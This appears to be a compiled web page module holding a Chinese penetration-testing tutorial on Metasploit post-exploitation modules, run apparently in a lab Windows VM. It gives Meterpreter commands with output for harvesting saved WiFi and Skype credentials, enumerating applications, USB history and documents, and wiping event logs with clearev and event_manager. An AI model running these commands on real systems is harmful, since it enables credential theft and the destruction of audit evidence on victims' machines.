import{i as e,r as t,s as n,t as r}from"./app-Cp6W-RnB.js";var i=JSON.parse(`{"path":"/md/hack/tools/2022-05-02-018-Metasploit%E5%85%B6%E4%BB%96%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97.html","title":"Metasploit其他后渗透模块","lang":"zh-CN","frontmatter":{"category":"binghe-code-hack","title":"Metasploit其他后渗透模块","tagline":"by 冰河","tag":["hack","binghe-code-hack"],"excerpt":"Metasploit其他后渗透模块","lock":"need"},"git":{"updatedTime":1777463154000,"contributors":[{"name":"binghe001","username":"binghe001","email":"“1028386804@qq.com”","commits":1,"url":"https://github.com/binghe001"}],"changelog":[{"hash":"0c729a71a0d0cfa76d3882bfe4121a6c63a1e729","time":1777463154000,"email":"“1028386804@qq.com”","author":"binghe001","message":"feature: 升级到vuepress2"}]},"filePathRelative":"md/hack/tools/2022-05-02-018-Metasploit其他后渗透模块.md"}`),a={name:`2022-05-02-018-Metasploit其他后渗透模块.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<h1 id="metasploit其他后渗透模块" tabindex="-1"><a class="header-anchor" href="#metasploit其他后渗透模块"><span>Metasploit其他后渗透模块</span></a></h1><h3 id="收集无线ssid信息" tabindex="-1"><a class="header-anchor" href="#收集无线ssid信息"><span>收集无线SSID信息</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">run post/windows/wlan/wlan_bss_list</span>
<span class="line">meterpreter &gt; run post/windows/wlan/wlan_bss_list</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="收集无线wifi密码" tabindex="-1"><a class="header-anchor" href="#收集无线wifi密码"><span>收集无线Wifi密码</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">run post/windows/wlan/wlan_profile</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>可以收集目标系统上保存的Wifi登录凭证。</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; run post/windows/wlan/wlan_profile</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h3 id="获取应用程序列表" tabindex="-1"><a class="header-anchor" href="#获取应用程序列表"><span>获取应用程序列表</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">run get_application_list</span>
<span class="line"></span>
<span class="line">meterpreter &gt; run get_application_list</span>
<span class="line"></span>
<span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/enum_applications.</span>
<span class="line">[!] Example: run post/windows/gather/enum_applications OPTION=value [...]</span>
<span class="line"></span>
<span class="line">Installed Applications</span>
<span class="line">======================</span>
<span class="line"></span>
<span class="line"> Name                                                            Version</span>
<span class="line"> ----                                                            -------</span>
<span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148  9.0.30729.4148</span>
<span class="line"> Radmin Server 3.5                                               3.50.0000</span>
<span class="line"> WebFldrs XP                                                     9.50.7523</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">meterpreter &gt; </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="获取skype密码" tabindex="-1"><a class="header-anchor" href="#获取skype密码"><span>获取Skype密码</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">run post/windows/gather/credentials/skype</span>
<span class="line"></span>
<span class="line">meterpreter &gt; run post/windows/gather/credentials/skype</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="获取usb使用历史信息" tabindex="-1"><a class="header-anchor" href="#获取usb使用历史信息"><span>获取USB使用历史信息</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">run post/windows/gather/usb_history</span>
<span class="line"></span>
<span class="line">meterpreter &gt; run post/windows/gather/usb_history</span>
<span class="line"></span>
<span class="line">[*] Running module against LIUYAZHUANG</span>
<span class="line">[*] </span>
<span class="line">   D:   IDE#CdRomNECVMWar_VMware_IDE_CDR10_______________1.00____#3031303030303030303030303030303030303130#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}</span>
<span class="line">   E:                                                                Disk 31ac31ab </span>
<span class="line"></span>
<span class="line">[-] No USB devices appear to have been connected to this host.</span>
<span class="line">meterpreter &gt; </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>利用这个模块可以轻松的伪造USB描述符合硬件ID</p><h3 id="查找文件" tabindex="-1"><a class="header-anchor" href="#查找文件"><span>查找文件</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; search -f *.doc</span>
<span class="line">Found 6 results...</span>
<span class="line">    c:\\Documents and Settings\\Default User\\Templates\\winword.doc (4608 bytes)</span>
<span class="line">    c:\\Documents and Settings\\Default User\\Templates\\winword2.doc (1769 bytes)</span>
<span class="line">    c:\\Documents and Settings\\lyz\\Templates\\winword.doc (4608 bytes)</span>
<span class="line">    c:\\Documents and Settings\\lyz\\Templates\\winword2.doc (1769 bytes)</span>
<span class="line">    c:\\WINDOWS\\system32\\config\\systemprofile\\Templates\\winword.doc (4608 bytes)</span>
<span class="line">    c:\\WINDOWS\\system32\\config\\systemprofile\\Templates\\winword2.doc (1769 bytes)</span>
<span class="line">meterpreter &gt; </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="清除目标系统上的日志" tabindex="-1"><a class="header-anchor" href="#清除目标系统上的日志"><span>清除目标系统上的日志</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">clearev</span>
<span class="line"></span>
<span class="line">meterpreter &gt; clearev</span>
<span class="line">[*] Wiping 190 records from Application...</span>
<span class="line">[*] Wiping 286 records from System...</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>另一个用来处理日志的模块就是event_manager</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; run event_manager </span>
<span class="line">Meterpreter Script for Windows Event Log Query and Clear.</span>
<span class="line"></span>
<span class="line">OPTIONS:</span>
<span class="line"></span>
<span class="line">    -c &lt;opt&gt;  Clear a given Event Log (or ALL if no argument specified)</span>
<span class="line">    -f &lt;opt&gt;  Event ID to filter events on</span>
<span class="line">    -h        Help menu</span>
<span class="line">    -i        Show information about Event Logs on the System and their configuration</span>
<span class="line">    -l &lt;opt&gt;  List a given Event Log.</span>
<span class="line">    -p        Supress printing filtered logs to screen</span>
<span class="line">    -s &lt;opt&gt;  Save logs to local CSV file, optionally specify alternate folder in which to save logs</span>
<span class="line"></span>
<span class="line">meterpreter &gt; </span>
<span class="line">meterpreter &gt; run event_manager -i</span>
<span class="line">[*] Retriving Event Log Configuration</span>
<span class="line"></span>
<span class="line">Event Logs on System</span>
<span class="line">====================</span>
<span class="line"></span>
<span class="line"> Name                   Retention  Maximum Size  Records</span>
<span class="line"> ----                   ---------  ------------  -------</span>
<span class="line"> Application            Disabled   524288K       0</span>
<span class="line"> Security               Disabled   524288K       Access Denied</span>
<span class="line"> System                 Disabled   524288K       0</span>
<span class="line"> ThinPrint Diagnostics  Disabled   K             1</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">meterpreter &gt; run event_manager -c</span>
<span class="line">[-] You must specify and eventlog to query!</span>
<span class="line">[*] Application: </span>
<span class="line">[*] Clearing Application</span>
<span class="line">[*] Event Log Application Cleared!</span>
<span class="line">[*] Security: </span>
<span class="line">[*] Clearing Security</span>
<span class="line">[-] Failed to Clear Security, Access Denied</span>
<span class="line">[*] System: </span>
<span class="line">[*] Clearing System</span>
<span class="line">[*] Event Log System Cleared!</span>
<span class="line">[*] ThinPrint Diagnostics: </span>
<span class="line">[*] Clearing ThinPrint Diagnostics</span>
<span class="line">[*] Event Log ThinPrint Diagnostics Cleared!</span>
<span class="line">meterpreter &gt; </span>
<span class="line">meterpreter &gt; </span>
<span class="line">meterpreter &gt; run event_manager -i</span>
<span class="line">[*] Retriving Event Log Configuration</span>
<span class="line"></span>
<span class="line">Event Logs on System</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="写在最后" tabindex="-1"><a class="header-anchor" href="#写在最后"><span>写在最后</span></a></h2><blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200906013715889.png" alt=""></p>`,23)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};